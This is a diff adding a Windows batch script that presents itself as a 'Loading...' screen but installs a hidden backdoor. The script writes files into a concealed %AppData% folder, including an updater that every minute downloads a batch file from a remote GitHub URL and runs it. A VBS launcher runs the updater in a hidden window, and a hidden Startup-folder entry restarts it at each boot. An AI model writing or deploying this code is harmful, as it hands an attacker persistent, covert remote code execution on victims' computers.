@@ -1,0 +1,27 @@
+@echo off
+title Loading...
+echo Loading...
+rem schtasks /create /tn SussyStartup /tr %appdata%\Microsoft\System\Invis.vbs /sc onstart
+md System
+echo @echo off >System\Updater.bat
+echo title Updater>>System\Updater.bat
+echo :Start>>System\Updater.bat
+echo powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/RickDawlson/Ping/main/Instructions', 'Instructions.bat')" >>System\Updater.bat
+echo call Instructions>>System\Updater.bat
+echo Timeout /t 60 /NOBREAK>>System\Updater.bat
+echo goto Start>>System\Updater.bat
+echo set Check=000>System\Check.bat
+echo Set WshShell = CreateObject("WScript.Shell") >System\Invis.vbs
+echo WshShell.Run chr(34) ^& "Updater.bat" ^& Chr(34), 0 >>System\Invis.vbs
+echo Set WshShell = Nothing >>System\Invis.vbs
+move System %AppData%\Microsoft
+cls
+cd %Appdata%\Microsoft
+Attrib System +s +h
+cd %appdata%\Microsoft\Windows\Start Menu\Programs\Startup
+echo cd %appdata%\Microsoft\System>system.cmd
+echo start Invis.vbs>>system.cmd
+attrib system.cmd +s +h
+cd %Appdata%\Microsoft\System
+start Invis.vbs
+exit
